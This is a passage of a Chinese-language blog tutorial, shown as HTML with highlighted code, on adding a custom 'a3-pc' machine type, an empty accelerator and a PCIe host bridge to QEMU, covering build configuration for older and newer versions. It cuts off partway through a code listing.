id="II、老版本-Qemu-配置方式（makefile）"><a href="#II、老版本-Qemu-配置方式（makefile）" class="headerlink" title="II、老版本 Qemu 配置方式（makefile）"></a>II、老版本 Qemu 配置方式（makefile）</h3><p>如果是版本稍微老一点的 Qemu 则应当在 <code>hw/a3-pc</code> 下创建如下目录结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree ./hw/a3-pc/</span><br>./hw/a3-pc/<br>├── accel.c<br>├── machine.c<br>└── Makefile.objs<br><br>0 directories, 3 files<br></code></pre></td></tr></table></figure><p>三个文件说明如下：</p><ul><li><code>Makefile.objs</code>：机器的 Makefile 文件</li><li><code>machine.c</code>：机器的主体代码</li><li><code>accel.c</code>：自定义的 accelerator 代码，也可以直接用默认的 TCG accelerator</li></ul><p>并在 <code>Makefile.objs</code> 中添加如下内容：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">obj-<span class="hljs-variable">$(CONFIG_A3_PC)</span> += accel.o<br>obj-<span class="hljs-variable">$(CONFIG_A3_PC)</span> += machine.o<br></code></pre></td></tr></table></figure><p>之后在 <code>hw/Makefile.objs</code> 中添加上该配置：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile">devices-dirs-y = core/<br><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(CONFIG_SOFTMMU)</span>, y)<br><span class="hljs-comment"># ...</span><br>devices-dirs-<span class="hljs-variable">$(CONFIG_A3_PC)</span> += a3-pc/<br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><p>这里我们通过添加一个新的选项 <code>CONFIG_A3_PC</code> 来控制是否要进行该类型机器的编译</p><p>笔者选择创建一个 i386 类型的机器，因此我们还需要修改 <code>hw/i386/Kconfig</code>，添加如下内容，表示一个空白的机器，后面我们若是需要添加硬件则还需要在这部分进行改动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config A3_PC<br>    bool<br></code></pre></td></tr></table></figure><p>最后我们在源码根目录的 <code>configure</code> 文件中添加如下内容即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-function"><span class="hljs-title">supported_a3_pc_target</span></span>() &#123;<br>    <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a3_pc</span>&quot;</span> = <span class="hljs-string">&quot;yes&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    glob <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-string">&quot;*-softmmu&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1%-softmmu&#125;</span>&quot;</span> <span class="hljs-keyword">in</span><br>x86_64)<br>    <span class="hljs-built_in">return</span> 0<br>    ;;<br>    <span class="hljs-keyword">esac</span><br>    <span class="hljs-built_in">return</span> 1<br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">supported_target</span></span>() &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-keyword">in</span><br><span class="hljs-comment"># ...</span><br>    supported_a3_pc_target <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    print_error <span class="hljs-string">&quot;TCG disabled, but hardware accelerator not available for &#x27;<span class="hljs-variable">$target</span>&#x27;&quot;</span><br>    <span class="hljs-built_in">return</span> 1<br>&#125;<br><span class="hljs-comment"># ...</span><br><span class="hljs-keyword">for</span> opt <span class="hljs-keyword">do</span><br>  optarg=$(<span class="hljs-built_in">expr</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$opt</span>&quot;</span> : <span class="hljs-string">&#x27;x[^=]*=\(.*\)&#x27;</span>)<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$opt</span>&quot;</span> <span class="hljs-keyword">in</span><br>  --<span class="hljs-built_in">help</span>|-h) show_help=<span class="hljs-built_in">yes</span><br>  ;;<br>  <span class="hljs-comment">#...</span><br>  ;;<br>  --enable-a3-pc) a3_pc=<span class="hljs-string">&quot;yes&quot;</span><br>  ;;<br><span class="hljs-comment"># ...</span><br><span class="hljs-comment"># 这一块可以放在 supported_whpx_target 的那个语句块下面</span><br><span class="hljs-keyword">if</span> supported_a3_pc_target <span class="hljs-variable">$target</span>; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;CONFIG_A3_PC=y&quot;</span> &gt;&gt; <span class="hljs-variable">$config_target_mak</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;CONFIG_A3_PC=y&quot;</span> &gt;&gt; <span class="hljs-variable">$config_host_mak</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>如果我们想要改变编译出来的可执行文件的名字，还可以在 <code>Makefile.target</code> 中修改如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-keyword">ifdef</span> CONFIG_USER_ONLY<br><span class="hljs-comment"># user emulator name</span><br>QEMU_PROG=qemu-<span class="hljs-variable">$(TARGET_NAME)</span><br>QEMU_PROG_BUILD = <span class="hljs-variable">$(QEMU_PROG)</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">ifdef</span> CONFIG_A3_PC<br><span class="hljs-comment"># arttnba3 type machine</span><br>QEMU_PROG=a3-pc<br><span class="hljs-keyword">else</span><br><span class="hljs-comment"># system emulator name</span><br>QEMU_PROG=qemu-system-<span class="hljs-variable">$(TARGET_NAME)</span><span class="hljs-variable">$(EXESUF)</span><br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><h2 id="二、定义新的-Machine-Type"><a href="#二、定义新的-Machine-Type" class="headerlink" title="二、定义新的 Machine Type"></a>二、定义新的 Machine Type</h2><h3 id="I、machine-c：machine-基本定义"><a href="#I、machine-c：machine-基本定义" class="headerlink" title="I、machine.c：machine 基本定义"></a>I、machine.c：machine 基本定义</h3><p>虽然 Qemu 是使用 C 语言编写的，但是在 Qemu 当中同样使用了 OOP 的思想，通过结构体嵌套的形式实现继承</p><p>在 Qemu 当中使用 <code>MachineState</code> 结构体类型表示一个通用虚拟机的状态，使用 <code>MachineClass</code> 结构体类型表示一个通用的虚拟机类型，因此对于我们需要创建的新的机器类型，我们需要分别定义他的状态类与类型类，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu-common.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/boards.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qom/object.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/sysemu.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    MachineState parent;<br><br>    Notifier machine_done;<br>&#125; A3PCMachineState;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    MachineClass parent;<br>&#125; A3PCMachineClass;<br></code></pre></td></tr></table></figure><p>这里对于继承自 MachineState 的子类我们添加了一个新的 <code>Notifier</code> 类型的成员，可以用来在后面构建事件通知链</p><p>我们还需要定义一些相应的父子类间转型的宏，以及一个表示新增的 <code>a3-pc</code> 类型的宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3PC_MACHINE MACHINE_TYPE_NAME(<span class="hljs-string">&quot;a3-pc&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3PC_MACHINE(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCMachineState, (obj), TYPE_A3PC_MACHINE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3PC_MACHINE_GET_CLASS(obj) \</span><br><span class="hljs-meta">    OBJECT_GET_CLASS(A3PCMachineClass, obj, TYPE_A3PC_MACHINE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3PC_MACHINE_CLASS(klass) \</span><br><span class="hljs-meta">    OBJECT_CLASS_CHECK(A3PCMachineClass, klass, TYPE_A3PC_MACHINE)</span><br></code></pre></td></tr></table></figure><p>接下来我们定义 MachineState 与 MachineClass 的初始化函数，这里只是一个最最简单的空模板，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init_done</span><span class="hljs-params">(Notifier *notifier, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init</span><span class="hljs-params">(MachineState *machine)</span><br>&#123;<br>    A3PCMachineState *ms = A3PC_MACHINE(machine);<br><br>    ms-&gt;machine_done.notify = a3_pc_machine_init_done;<br>    qemu_add_machine_init_done_notifier(&amp;ms-&gt;machine_done);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    MachineClass *mc = MACHINE_CLASS(oc);<br><br>    mc-&gt;init = a3_pc_machine_init;<br>    <span class="hljs-comment">// 这里设置了一个参数，指定了使用我们自己的 accelerator</span><br>    mc-&gt;default_machine_opts = <span class="hljs-string">&quot;accel=a3acl&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们需要声明一个 <code>TypeInfo</code> 类型的变量，用来表示我们新建的这一种机器类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_pc_machine_info = &#123;<br>    .name = TYPE_A3PC_MACHINE,<br>    .parent = TYPE_MACHINE,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCMachineState),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3PCMachineClass),<br>    .class_init = a3_pc_machine_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>最后就是注册我们的新机器类型了，这里使用 <code>type_init()</code> 来完成，原理是 gcc constructor attribute 使其会调用 <code>a3_pc_machine_register()</code> 来注册 <code>a3_pc_machine_info</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_register</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register_static(&amp;a3_pc_machine_info);<br>&#125;<br>type_init(a3_pc_machine_register);<br></code></pre></td></tr></table></figure><h3 id="II、accel-c：accelerator-定义"><a href="#II、accel-c：accelerator-定义" class="headerlink" title="II、accel.c：accelerator 定义"></a>II、accel.c：accelerator 定义</h3><p>接下来就是定义我们自己的 accelerator，因为 Qemu 默认需要一个 accelerator，但如果再去和原有的 accelerator 做适配就太麻烦了（<del>因为👴是懒🐕</del>），所以这里我们自己定义一个空的 accelerator，不过这一部分我们只需要声明一个新的 <code>TypeInfo</code> 类型变量即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/module.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/boards.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/qdev-core.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/accel.h&quot;</span></span><br><br><span class="hljs-type">bool</span> a3_pc_allowed;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3_pc_init</span><span class="hljs-params">(MachineState *ms)</span><br>&#123;<br>    MachineClass *mc = MACHINE_GET_CLASS(ms);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * opt out of system RAM being allocated by generic code</span><br><span class="hljs-comment">     */</span><br>    mc-&gt;default_ram_id = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_accel_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    AccelClass *ac = ACCEL_CLASS(oc);<br>    <span class="hljs-type">static</span> GlobalProperty compat[] = &#123;<br>        &#123; <span class="hljs-string">&quot;migration&quot;</span>, <span class="hljs-string">&quot;store-global-state&quot;</span>, <span class="hljs-string">&quot;off&quot;</span> &#125;,<br>        &#123; <span class="hljs-string">&quot;migration&quot;</span>, <span class="hljs-string">&quot;send-configuration&quot;</span>, <span class="hljs-string">&quot;off&quot;</span> &#125;,<br>        &#123; <span class="hljs-string">&quot;migration&quot;</span>, <span class="hljs-string">&quot;send-section-footer&quot;</span>, <span class="hljs-string">&quot;off&quot;</span> &#125;,<br>    &#125;;<br><br>    ac-&gt;name = <span class="hljs-string">&quot;A3ACL&quot;</span>;<br>    ac-&gt;init_machine = a3_pc_init;<br>    ac-&gt;allowed = &amp;a3_pc_allowed;<br>    ac-&gt;compat_props = g_ptr_array_new();<br><br>    compat_props_add(ac-&gt;compat_props, compat, G_N_ELEMENTS(compat));<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3_ACCEL ACCEL_CLASS_NAME(<span class="hljs-string">&quot;a3acl&quot;</span>)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_pc_accel_type = &#123;<br>    .name = TYPE_A3_ACCEL,<br>    .parent = TYPE_ACCEL,<br>    .class_init = a3_pc_accel_class_init,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_type_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register_static(&amp;a3_pc_accel_type);<br>&#125;<br><br>type_init(a3_pc_type_init);<br></code></pre></td></tr></table></figure><h4 id="新版本-accelerator-额外添加-ops"><a href="#新版本-accelerator-额外添加-ops" class="headerlink" title="*新版本 accelerator 额外添加 ops"></a>*新版本 accelerator 额外添加 ops</h4><p>需要注意的是 qemu 的 7.0 和 5.0 的版本之间代码架构有一定的改动，所以对于 7.0 版本我们还需要额外定义一个 AccelClassOps：</p><blockquote><p> 当然，也可以直接用原有的 accelerator ，比如说 <code>tcg</code>，直接在 machine.c 代码中指定 <code>accel=tcg</code> 即可</p></blockquote><blockquote><p>添加文件：accel&#x2F;a3acl&#x2F;a3acl-accel-ops.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * QEMU A3ACL vCPU common functionality</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Copyright (c) 22 arttnba3</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Just modify it like what you want : )</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu-common.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/accel-ops.h&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_handle_interrupt</span><span class="hljs-params">(CPUState *cpu, <span class="hljs-type">int</span> mask)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_kick_vcpu_thread</span><span class="hljs-params">(CPUState *unused)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_start_vcpu_thread</span><span class="hljs-params">(CPUState *cpu)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_accel_ops_init</span><span class="hljs-params">(AccelOpsClass *ops)</span><br>&#123;<br>    <span class="hljs-comment">// 这几个函数可以按照个人需要来进行改造，笔者这里仅作占位符</span><br>    ops-&gt;create_vcpu_thread = a3acl_start_vcpu_thread;<br>    ops-&gt;kick_vcpu_thread = a3acl_kick_vcpu_thread;<br>    ops-&gt;handle_interrupt = a3acl_handle_interrupt;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_accel_ops_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    AccelOpsClass *ops = ACCEL_OPS_CLASS(oc);<br><br>    ops-&gt;ops_init = a3acl_accel_ops_init;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3acl_accel_ops_type = &#123;<br>    .name = ACCEL_OPS_NAME(<span class="hljs-string">&quot;a3acl&quot;</span>),<br>    .parent = TYPE_ACCEL_OPS,<br>    .class_init = a3acl_accel_ops_class_init,<br>    .abstract = <span class="hljs-literal">true</span>,<br>&#125;;<br>module_obj(ACCEL_OPS_NAME(<span class="hljs-string">&quot;a3acl&quot;</span>));<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_accel_ops_register_types</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register_static(&amp;a3acl_accel_ops_type);<br>&#125;<br>type_init(a3acl_accel_ops_register_types);<br><br></code></pre></td></tr></table></figure><blockquote><p>添加文件：accel&#x2F;a3acl&#x2F;meson.build</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs meson">a3acl_ss = ss.source_set()<br>a3acl_ss.add(files(<br>  &#x27;a3acl-accel-ops.c&#x27;,<br>))<br><br>specific_ss.add_all(when: &#x27;CONFIG_A3ACL&#x27;, if_true: a3acl_ss)<br></code></pre></td></tr></table></figure><blockquote><p>修改文件：accel&#x2F;meson.build</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs meson">if have_system<br>  subdir(&#x27;hvf&#x27;)<br>  subdir(&#x27;qtest&#x27;)<br>  subdir(&#x27;kvm&#x27;)<br>  subdir(&#x27;xen&#x27;)<br>  subdir(&#x27;stubs&#x27;)<br>  subdir(&#x27;a3acl&#x27;) # 加上这句<br>endif<br></code></pre></td></tr></table></figure><blockquote><p>修改文件：accel&#x2F;Kconfig</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kconfig"># 添加上这：<br>config A3ACL<br>    bool<br>    default y<br></code></pre></td></tr></table></figure><h2 id="三、添加设备结构🕊"><a href="#三、添加设备结构🕊" class="headerlink" title="三、添加设备结构🕊"></a>三、添加设备结构🕊</h2><p>现在我们已经有了一台可以运行的空白的机器——但包括 CPU 在内的所有设备目前暂且都是不存在的，因此我们需要手动地构造机器的设备结构</p><h3 id="I、添加新的-PCIe-Host-Bridge"><a href="#I、添加新的-PCIe-Host-Bridge" class="headerlink" title="I、添加新的 PCIe Host Bridge"></a>I、添加新的 PCIe Host Bridge</h3><p>一个空的机器什么都没有，那自然是什么都干不了的，所以我们首先需要为这个机器添加上一个 <code>PCIe Host Bridge</code>，从而让我们的机器可以添加新的 PCIe 设备</p><p>惯例地就是定义一个新的 <code>PCIe Host Bridge</code> 类型的新 PCIe 设备：</p><blockquote><p>添加文件：include&#x2F;hw&#x2F;pci-host&#x2F;a3pc.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> HW_A3_PC_PCIE_HOST_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HW_A3_PC_PCIE_HOST_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;exec/memory.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pcie_host.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCPCIEHost</span> &#123;</span><br>    PCIExpressHost parent_obj;<br><br>    MemoryRegion mem;<br>    MemoryRegion io;<br>&#125; A3PCPCIEHost;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3_PC_PCIE_HOST <span class="hljs-string">&quot;a3-pc-pcie-host&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3_PC_PCIE_HOST(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCPCIEHost, (obj), TYPE_A3_PC_PCIE_HOST)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* HW_A3_PC_PCIE_HOST_H */</span></span><br></code></pre></td></tr></table></figure><blockquote><p>添加文件：hw&#x2F;pci-host&#x2F;a3pc.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 